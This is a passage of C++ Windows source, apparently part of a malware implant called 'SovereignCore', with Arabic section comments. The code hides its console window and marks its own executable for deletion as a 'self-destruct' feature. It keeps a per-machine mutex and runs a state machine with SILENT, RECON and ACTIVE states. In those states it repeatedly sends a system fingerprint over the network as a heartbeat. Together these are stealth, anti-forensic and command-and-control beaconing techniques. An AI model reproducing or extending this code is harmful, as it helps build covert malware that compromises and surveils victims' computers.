        InitializeStateMachine();
        InitializeHealthChecks();
        InitializeRecoveryDAG();

        fsm.Fire(SystemEvent::INIT);
    }

    ~SovereignCore() {
        fsm.Fire(SystemEvent::SHUTDOWN);
        scheduler->Stop();
        CryptoEngine::SecureWipe(systemFingerprint);
    }

    void Run() {
        if (!fsm.IsInState(SystemState::SILENT)) return;

        scheduler->Start([this] {
            metrics->RecordOp();
            health->RunChecks();

            if (!health->IsHealthy()) {
                metrics->RecordError();
                fsm.Fire(SystemEvent::ERROR);
                return;
            }

            switch (fsm.GetState()) {
            case SystemState::SILENT:
                break;

            case SystemState::RECON:
            case SystemState::ACTIVE: {
                auto result = network->SendData(systemFingerprint);

                if (result == NetworkClient::SendResult::SUCCESS) {
                    fsm.Fire(SystemEvent::HEARTBEAT);
                }
                else {
                    metrics->RecordError();
                    fsm.Fire(SystemEvent::ERROR);
                }
                break;
            }

            case SystemState::RECOVERY:
                dag->Recover("Core");
                fsm.Fire(SystemEvent::RECOVER);
                break;

            case SystemState::SHUTDOWN:
                scheduler->Stop();
                break;
            }
            });

        while (running.load(std::memory_order_acquire)) {
            std::this_thread::sleep_for(std::chrono::seconds(1));
        }
    }

    void Shutdown() {
        running.store(false, std::memory_order_release);
        fsm.Fire(SystemEvent::SHUTDOWN);
    }
};

// =====================================================================
// ميزة التدمير الذاتي المحسنة
// =====================================================================
void SelfDestruct() {
    TCHAR szModuleName[MAX_PATH];
    GetModuleFileName(NULL, szModuleName, MAX_PATH);

    if (!MoveFileEx(szModuleName, NULL, MOVEFILE_DELAY_UNTIL_REBOOT)) {
        DeleteFile(szModuleName);
    }
}

// =====================================================================
// ENTRY POINT ULTIMATE - مع إصلاحات كاملة
// =====================================================================
int WINAPI WinMain(HINSTANCE hI, HINSTANCE hP, LPSTR lpC, int nS) {
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);
    FreeConsole();

    SelfDestruct();

    char computerName[MAX_COMPUTERNAME_LENGTH + 1] = { 0 };
    DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
    GetComputerNameA(computerName, &size);

    std::string mutexName = "Sovereign_Ultimate_Mutex_" + std::string(computerName);

    HANDLE hMutex = CreateMutexA(nullptr, TRUE, mutexName.c_str());
    if (!hMutex || GetLastError() == ERROR_ALREADY_EXISTS) {
        if (hMutex) CloseHandle(hMutex);
        return 0;
    }

    try {
        SovereignCore core;
        core.Run();
    }
    catch (...) {
        CloseHandle(hMutex);
        return 1;
    }

    CloseHandle(hMutex);
    return 0;
}


